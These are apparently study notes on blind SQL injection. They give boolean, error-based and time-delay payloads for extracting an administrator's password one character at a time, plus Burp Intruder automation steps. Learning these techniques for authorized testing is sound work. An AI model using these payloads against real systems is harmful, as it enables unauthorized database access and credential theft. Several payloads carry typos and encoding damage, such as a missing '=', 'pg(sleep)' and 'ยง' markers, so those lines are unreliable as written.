## Blind Injection using Conditional Responses
To retrieve a password value for a user, we can use Blind Injection.

**Determine UI Changes**
These two statements should cause the UI to show success and failure states for a query.

```
' AND 1='1
' AND 1='2
```

**Determine Table Exists.**
Next, we can check that a table exists.

```
' AND (SELECT 'a' FROM ***table_name*** LIMIT 1)='a
```

**Determine User Exists**
We can then check for a valid user to enumerate a password for.

```
' AND (SELECT 'a' FROM ***table_name*** WHERE username='***user***')='a
```

**Enumerate Password Length**
We can use the LENGTH() operator to get a bool result if the password is greater or less than a certain length.

```
` AND (SELECT 'a' FROM ***table_name*** WHERE username='***user***' AND LENGTH(password)>1)'a
```

```
` AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
` AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 'b' ELSE 'a' END FROM Users)='a`
```

*Automation*
We can automate this by creating an attack using Intruder.
 1. Forward a request from the Proxy to the Intruder.
 2. Create a SNIPER attack.
 3. Set a payload position to the LENGTH operator.
 4. Create a 'NUMBERS' payload, with a From=1 To=30(depends) value, and a Step=1
 5. Grep - Match for the value in the UI shown when a query returns true.

Enumerate Password
We can check each character of a password for the correct one. 
```
' AND (SELECT SUBSTRING(password,INDEX,1) FROM ***table_name*** WHERE username='***user***')='CHAR_TO_CHECK

#eg password[5] === b
' AND (SELECT SUBSTRING(password,5,1) FROM ***table_name*** WHERE username='***user***')='b
```

*Automation*
We can automate this by creating an attack using Intruder.
 1. Forward a request from the Proxy to the Intruder.
 2. Create a CLUSTER BOMB attack.
 3. Set the payload positions to the INDEX operator and the CHAR_TO_CHECK.
 4. Payload values should be:
	 1. This should be a numbers list, from 1 to PASSWORD_LENGTH, retrieved from the step above.
	 2. This should point to a file containing all acceptable characters in a password. 
 5. Grep - Match for the value in the UI shown when a query returns true.

##### Blind Injection using SQL Errors
This is the same as above but instead triggering SQL errors.

Divide By Zero
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

Check Row Exists
```
`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
```

Template
```
`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END CONDITION/QUERY TO EVALUTE)||'`
```

##### Blind Injection using Delays 
Instead of determining the boolean output of a query, we can trigger a delay to the response instead. 

**First**
- Ensure that the target field responds to SQL Queries 
- Ensure that a delay is triggered for the correct circumstances 

**Key Points:**
- Must be run 1 request at a time in a Burp Resource Pool.
- The critical difference is that we have to start a new SQL statement instead of appending a `||` or `AND`. 

Example Query
```
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)=10) THEN pg_sleep(10) ELSE pg(sleep) END FROM users--
'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTRING(password,ยง1ยง,1)%3d'ยงaยง')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+from+users--
```

*Automation*
Same as conditional UI and errors, except with a resource pool of 1 concurrent connection.

**Different Delays per Platform**
*Oracle*
`dbms_pipe.receive_message(('a'),10)`

*Microsoft*
`WAITFOR DELAY '0:0:10'`

*PostgreSQL*
`SELECT pg_sleep(10)`

*MySQL*
`SELECT SLEEP(10)`
##### Using Burp Collaborator
We can trigger DNS interaction and receive results from queries using Burp Collaborator.
The PortSwigger Cheat Sheet has guides on how to use the collaborator.

The result of the query is returned in the subdomain request to the collaborator. 
https://portswigger.net/web-security/sql-injection/cheat-sheet